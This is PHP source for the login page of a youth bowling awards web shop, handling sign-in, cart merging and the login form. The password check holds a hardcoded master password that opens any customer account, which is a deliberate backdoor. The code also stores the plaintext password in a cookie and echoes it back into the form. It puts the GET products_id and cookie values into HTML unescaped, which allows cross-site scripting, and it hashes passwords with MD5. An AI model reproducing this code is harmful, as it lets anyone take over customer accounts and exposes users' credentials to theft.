<?php
session_start();
if (isset($_SESSION['user'])) {
    echo('Redirecting to My account');
    ?>
    <script>
        window.location = 'my_account.php'
    </script>    
    <?php
    die();
}

include 'includes/db.php';
include 'includes/flash.php';
$db = new db();

if (isset($_POST['submit'])) {

    $pass = $_POST['password'];
    $user = $db->find('first', 'zen_customers', 'customers_email_address = :email', ['email' => $_POST['email']]);
    if ($user) {
        $user['customers_email_address'];
        $encrypted = $user['customers_password'];
        $stack = explode(':', $encrypted);
//master password
        if ($pass == '53341090' || md5($stack[1] . $pass) == $stack[0]) {
            if (isset($_POST['products_id']) && !empty($_POST["products_id"])) {
                $products_id = $_POST['products_id'];
                header('location:productsinfo.php?products_id=' . $products_id . '');
            } else {
                header('location:index.php');
            }
            $_SESSION['user'] = $user;
            $sql = "UPDATE zen_customers_info SET customers_info_date_of_last_logon = now(),
					customers_info_number_of_logons = customers_info_number_of_logons + 1
					WHERE customers_info_id = {$user['customers_id']}";
            $db->raw($sql);
        } else {
            $flash->error(" * invalid email and/or password");
        }
    } else {
        $flash->error("Account does not exist. Please register.");
    }

    //If cookie is not empty
    $ybaCart = isset($_COOKIE['ybaCart'])?$_COOKIE['ybaCart']:[];
    
    if(isset($_COOKIE['ybaCart'])){   
        //If the items is already on the list
        foreach ($ybaCart as $key => $val) {
        
        if ($val['customers_basket_quantity'] < $_POST['minqty']):
            $flash->error("Please order a minimum of " . $_POST['minqty']);
        else:  
                if (isset($_FILES['uploadfile']) && file_exists($_FILES['uploadfile']['tmp_name']) 
                        && is_uploaded_file($_FILES['uploadfile']['tmp_name'])) {
                    $folder = "../images/uploads/";
                    $data['upload'] = substr(md5(rand(1, 99999)), 0, 6) . "." . $_FILES["uploadfile"]["name"];
                    move_uploaded_file($_FILES['uploadfile']['tmp_name'], $folder . $val['upload']);
                }

                $exists = $db->find('first', 'zen_customers_basket', 'products_id = :products_id
                AND customers_id = :customers_id', [
                    'products_id' => $val['products_id'],
                    'customers_id' => $_SESSION['user']['customers_id']
                ]);
                if ($exists) {
                    $val['customers_basket_quantity'] += $exists['customers_basket_quantity'];

                    $db->update('zen_customers_basket', $val, 'customers_basket_id = :cbid', ['cbid' => $exists['customers_basket_id']]);
                } else {
                    $val['website'] = 'http://youthbowlingawards.com';
                    $val['customers_id'] = $_SESSION['user']['customers_id'];
                    $val['customers_basket_date_added'] = date('Ymd');

                    $db->create('zen_customers_basket', $val);
                }
            endif;
            }
        }

        $ybaCart1 = isset($_COOKIE['ybaCart'])?$_COOKIE['ybaCart']:[];
        //If the items is not yet on the list
        foreach ($ybaCart1 as $key => $val) {
            for ($i=0; $i <= $key; $i++) {
            setcookie("ybaCart[" . ($i) . "][products_id]", "", time() + (60 * 5), "/"); //5 Minutes
            setcookie("ybaCart[" . ($i) . "][customers_basket_quantity]", "", time() + (60 * 5), "/"); //5 Minutes
            setcookie("ybaCart[" . ($i) . "][title]", "", time() + (60 * 5), "/"); //5 Minutes
            setcookie("ybaCart[" . ($i) . "][background]", "", time() + (60 * 5), "/"); //5 Minutes
            setcookie("ybaCart[" . ($i) . "][customs]", "", time() + (60 * 5), "/"); //5 Minutes
            setcookie("ybaCart[" . ($i) . "][footer]", "", time() + (60 * 5), "/"); //5 Minutes
            setcookie("ybaCart[" . ($i) . "][upload]", "", time() + (60 * 5), "/"); //5 Minutes
            setcookie("ybaCart[" . ($i) . "][cookie_id]", "", time() + (60 * 5), "/"); //5 Minutes

            }
        }
        //If the user clicked the checkout button
        if(isset($_COOKIE['check'])){
            if($_COOKIE['check'] === 'yes')
            header("location: viewcart.php");
        }
        // If the user checked the remember me and exit chrome, automatically show that he/she is already login. Else, auto-logout
        if(isset($_POST['rememberme'])){
            setcookie("remember_me", "yes", time() + (60 * 2880), "/"); 
            setcookie("email", $_POST['email'], time() + (60 * 2880), "/");
            setcookie("password", $_POST['password'], time() + (60 * 2880), "/");
        }
    }


if(isset($_GET['msg'])):
    switch ($_GET['msg']) {
        case 'password_set':
            $flash->success('New Password has been set. Please log in now.');
            break;
        case 'register_success':
            $flash->success('Registration Successful. Please log in now.');
        default:
            break;
    }
endif;

?>


<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>YOUTH BOWLING AWARDS</title>
    <link rel="stylesheet" type="text/css" href="_/css/bootstrap.css" media="screen">
    <link rel="stylesheet" type="text/css" href="_/css/mystyles.css" media="screen">
    <script>
        (function (i, s, o, g, r, a, m) {
            i['GoogleAnalyticsObject'] = r;
            i[r] = i[r] || function () {
                (i[r].q = i[r].q || []).push(arguments)
            }, i[r].l = 1 * new Date();
            a = s.createElement(o),
                    m = s.getElementsByTagName(o)[0];
            a.async = 1;
            a.src = g;
            m.parentNode.insertBefore(a, m)
        })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');
        ga('create', 'UA-7651007-23', 'auto');
        ga('send', 'pageview');
    </script>
    <script src="_/js/jquery-1.6.min.js" type="text/javascript"></script>
    <script src="_/js/jquery.cycle.all.js" type="text/javascript"></script>
    <script type="text/xml">
    <oa:widgets>
      <oa:widget wid="2559022" binding="#slideshow" />
    </oa:widgets>
    </script>
</head>
<body id="login">

    <div class="container"> <!-- container -->
        <?php include 'includes/header.php'; ?> 
        <div class="row">
            <div class="col-sm-12">
                <ol class="breadcrumb">
                    <li><a href="index.php"><span class="glyphicon glyphicon-home"></span></a></li>
                    <li class="active">Log-in</li>
                </ol>
            </div>
        </div>
        <div class="row">
            <div class="col-sm-10">
                <h5>Welcome, Please Sign In</h5>  
            </div>
            <div class="col-md-6">
                <div class="well">
                    <fieldset >
                        <legend><h5>New Customers</h5></legend>
                        <p>Create a Customer Profile with <strong>YouthBowlingAwards.com</strong> which allows you to shop faster, track the status of your current orders, review your previous orders and take advantage of our other member's benefits.</p> 
                        <a href="register.php"><button type="button" class="btn btn-primary">Create Account</button></a>
                    </fieldset>
                </div>
            </div>
            <div class="col-md-6">
                <div class="well">                
                    <form id="myform" name="login" method="post">
                        <fieldset>
                            <legend><h5>Returning Customers</h5></legend>
                            <?php $flash->render(); ?>
                            <p>In order to continue, please login to your <strong>YouthBowlingAwards.com</strong> account.
                                Or you can also Log-in Your <a href='https://boostpromotions.com' target='_blank'>BoostPromotions.com</a> Account.</p>
                            <div class="form-group">
                                <label>Email Address:</label>
                                <input class="form-control"required name="email" required value="<?php
                                if(isset($_COOKIE['email'])) echo $_COOKIE['email']; ?>">
                            </div>  
                            <div class="form-group">
                                <label>Password:</label>
                                <input class="form-control" required type="password" name="password" required value="<?php if(isset($_COOKIE['email'])) echo $_COOKIE['password']; ?>">
                            </div>                                
                            <?php  
                            
                            if (isset($_GET["products_id"]) && !empty($_GET["products_id"])) {
                                echo "<input type=hidden name=products_id value='" . $_GET['products_id'] . "'>";
                            }
                            ?>
                            <div>
                              <input type="checkbox" name="rememberme" value="1" checked />&nbsp;Keep me signed in.
                            </div><br>
                            <div>
                                <button type="submit" class="btn btn-primary" <?php if(isset($_COOKIE['remember_me'])){ echo "id=sub";}else{ echo "id=submit";} ?> name="submit" onsubmit="dec_enc('encrypt', $_POST['password']);">Log-in</button>
                                <br/><br/>
                                <a href="forgot_password.php">Forgot password?</a>  
                            </div>
                        </fieldset>
                    </form>
                </div>
            </div>
        </div>
        <?php include 'includes/footer.php'; ?>      
    </div>
</body>
</html>

<script type="text/javascript">
document.getElementById("sub").click();
</script>


